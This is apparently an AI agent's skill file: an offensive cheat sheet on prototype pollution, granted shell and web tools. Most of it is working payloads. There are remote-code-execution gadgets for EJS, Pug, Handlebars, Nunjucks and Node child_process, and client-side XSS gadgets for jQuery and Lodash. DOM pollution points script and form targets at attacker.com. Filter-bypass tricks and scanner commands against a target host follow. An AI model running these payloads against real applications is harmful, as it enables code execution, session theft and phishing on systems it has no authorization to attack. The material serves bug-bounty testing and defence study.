---
name: prototype-pollution
description: Advanced prototype pollution — server-side RCE via EJS/Pug/Handlebars/Nunjucks template gadgets, Node.js child_process shell injection, client-side gadgets (jQuery/Lodash/Angular/Vue), detection techniques, and filter bypass. Load js-analyzer skill for PP fundamentals first.
sources: hack_skills, bug_bounty_reports
allowed-tools: Bash Read Write Edit Glob Grep Agent WebFetch WebSearch
---

# SKILL: Prototype Pollution Advanced — RCE & Gadget Exploitation

> **AI LOAD INSTRUCTION**: Advanced prototype pollution escalation. Covers server-side RCE via template engines (EJS, Pug, Handlebars, Nunjucks), Node.js child_process gadgets, client-side script gadgets in jQuery/Lodash, filter bypass patterns, and systematic detection. Load js-analyzer skill first for PP fundamentals (merge sinks, `__proto__` vs `constructor.prototype`, basic probes).

## 0. RELATED ROUTING

- js-analyzer — PP fundamentals, merge-sink detection, basic probes
- ssti-hunter — template engine RCE context (PP often triggers through template gadgets)
- xss — client-side PP gadgets ultimately achieve XSS

---

## 1. SERVER-SIDE PP → RCE

### 1.1 Node.js child_process — Shell/ENV Injection

When `child_process.spawn` or `exec` is called without explicit `env`/`shell` options, it inherits from `Object.prototype`:

```json
// Pollution payload:
{"__proto__": {"shell": "/proc/self/exe", "argv0": "console.log(require('child_process').execSync('id').toString())//", "NODE_OPTIONS": "--require /proc/self/cmdline"}}
```

```javascript
// Alternative ENV pollution:
Object.prototype.env = {"NODE_OPTIONS": "--require /proc/self/cmdline"};
// Next spawn() call will inherit the polluted env
```

### 1.2 EJS (Embedded JavaScript Templates) — RCE

EJS `render()` reads opts from object properties. Polluting `outputFunctionName` injects code into the compiled template function:

```json
{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"}}
```

When EJS renders ANY template after pollution:
```
Compiled function includes: var x;process.mainModule.require('child_process').execSync('id');s = "";
→ RCE
```

### 1.3 Pug (formerly Jade) — RCE

Pug's compiler reads `block` from object properties:

```json
{"__proto__": {"block": {"type": "Text", "val": "x]);process.mainModule.require('child_process').execSync('id');//"}}}
```

Alternative via `self` option:
```json
{"__proto__": {"self": true, "line": "x]});process.mainModule.require('child_process').execSync('id');//"}}
```

### 1.4 Handlebars — RCE

```json
{"__proto__": {"type": "Program", "body": [{"type": "MustacheStatement", "path": {"type": "PathExpression", "original": "constructor.constructor('return process.mainModule.require(`child_process`).execSync(`id`)')()","parts": ["constructor","constructor"]}, "params": [], "hash": null}]}}
```

### 1.5 Nunjucks — RCE

```json
{"__proto__": {"type": "Code", "value": "global.process.mainModule.require('child_process').execSync('id')"}}
```

### 1.6 Express res.render (Generic)

When Express calls `res.render()`, options merge with polluted prototype:

```json
{"__proto__": {"view options": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"}}}
```

---

## 2. CLIENT-SIDE PROTOTYPE POLLUTION

### 2.1 jQuery Gadgets

`$.extend(true, {}, userInput)` performs deep merge — classic PP sink:

```javascript
// Pollution for DOM XSS:
Object.prototype.innerHTML = '<img src=x onerror=alert(1)>';
// Or via URL hash:
// url.com/#__proto__[innerHTML]=<img src=x onerror=alert(1)>
```

### 2.2 Lodash Gadgets

```javascript
// Vulnerable functions (deep merge):
_.merge({}, userInput)
_.defaultsDeep({}, userInput)
_.set(obj, path, value)  // if path is attacker-controlled

// template() gadget:
Object.prototype.sourceURL = '\u000ajavascript:alert(1)//';
_.template('hello')();  // sourceURL injected into Function constructor → XSS
```

### 2.3 Script Gadgets Table

| Framework | Vulnerable Function | Polluted Property | Impact |
|---|---|---|---|
| jQuery | `$.extend(true)`, DOM methods | `innerHTML`, `src`, `href` | XSS |
| Lodash | `_.defaultsDeep`, `_.template` | `sourceURL`, `constructor` | XSS / RCE |
| Angular.js | `$interpolate`, `angular.merge` | `__defineGetter__`, `attrs` | XSS |
| Vue.js | `Vue.set`, template compilation | `template`, `render` | XSS |
| Ember.js | Component rendering | Various view properties | XSS |
| Backbone.js | `_.template` | `sourceURL` | XSS |

### 2.4 DOM Property Pollution

```javascript
Object.prototype.src = 'https://attacker.com/evil.js';
Object.prototype.href = 'javascript:alert(1)';
Object.prototype.action = 'https://attacker.com/phish';
// Any dynamically created element may inherit these
```

---

## 3. INJECTION PATTERNS (WHERE TO INJECT)

### 3.1 JSON Body

```json
{"__proto__": {"polluted": "yes"}}
{"constructor": {"prototype": {"polluted": "yes"}}}
{"__proto__[polluted]": "yes"}
```

### 3.2 URL Parameters

```
?__proto__[polluted]=yes
?constructor[prototype][polluted]=yes
?__proto__.polluted=yes
```

### 3.3 HTTP Headers

```
X-Custom-Header: {"__proto__":{"polluted":"yes"}}
// If header value is JSON.parse'd
```

### 3.4 Merge/Clone Functions (Common Sinks)

```javascript
// All these may be vulnerable to PP:
Object.assign({}, userInput)
{...obj, ...userInput}
JSON.parse('{"__proto__":{"polluted":"yes"}}')  // Safe: creates new plain obj
// But: lodash.merge, jQuery.extend(true), deepmerge are vulnerable
```

---

## 4. DETECTION TECHNIQUES

### 4.1 Black-Box Server-Side Detection

```
Step 1: Inject and check
  POST /api/endpoint
  {"__proto__":{"polluted":"yes"}}
  
  Then: GET /api/anything
  Check if response changes

Step 2: Error-based detection
  {"__proto__":{"toString":1}}
  → If server crashes or returns 500, toString was overwritten

Step 3: Response differential
  {"__proto__":{"status":555}}
  → Check if HTTP status code changes to 555
  
  {"__proto__":{"content-type":"text/plain"}}
  → Check if Content-Type header changes
```

### 4.2 Black-Box Client-Side Detection

```javascript
// In browser console:
Object.prototype.testPollution
// If returns a value → prototype polluted

// Automated via proxy:
// Add __proto__[detectedBy]=burp to all JSON bodies
// Look for "detectedBy" appearing in responses
```

### 4.3 Automated Tools

```bash
# ppfuzz: prototype pollution fuzzer
npm install -g ppfuzz
ppfuzz -u https://target.com --depth 5

# ppmap: scan for prototype pollution in URLs
ppmap -u "https://target.com/?q=test" -s payloads.txt

# Burp extension: prototype pollution fuzzer
# Available in BApp Store
```

---

## 5. FILTER BYPASS

### 5.1 Keyword Filtering (__proto__ blocked)

```
// Alternative paths:
constructor.prototype
constructor[prototype]
__proto__
__proto__[key]

// Deep nesting bypass:
{"constructor": {"prototype": {"key": "value"}}}
{"__proto__": {"__proto__": {"key": "value"}}}  // Double nesting

// Mixed encoding:
%5F%5Fproto%5F%5F[key]=value  // URL encoded __
```

### 5.2 Property Name Filtering

```json
// If specific property names are blocked:
// Use bracket notation variations
{"__proto__": {"__defineGetter__": "..."}}
{"__proto__": {"valueOf": "..."}}
// Try indirect pollution via chain
```

---

## 6. PP EXPLOITATION DECISION TREE

```
Prototype pollution confirmed?
│
├── Server-side (Node.js)?
│   ├── EJS rendering? → outputFunctionName gadget → RCE
│   ├── Pug rendering? → block/line gadget → RCE
│   ├── Handlebars? → type/body gadget → RCE
│   ├── Nunjucks? → type/value gadget → RCE
│   ├── child_process spawn/exec? → shell/env gadget → RCE
│   └── Generic? → try status (HTTP status change), content-type change
│
├── Client-side?
│   ├── jQuery present? → $.extend deep merge → innerHTML gadget
│   ├── Lodash present? → _.defaultsDeep → sourceURL gadget
│   ├── Angular.js? → template injection via polluted attrs
│   ├── Vue.js? → template/render gadget
│   └── Generic? → src/href/action gadget on dynamic DOM creation
│
└── Testing for PP?
    ├── Inject {"__proto__":{"status":555}} → check HTTP status
    ├── Inject {"__proto__":{"polluted":"yes"}} → check in responses
    └── Error-based: {"__proto__":{"toString":1}} → check for 500 errors
```

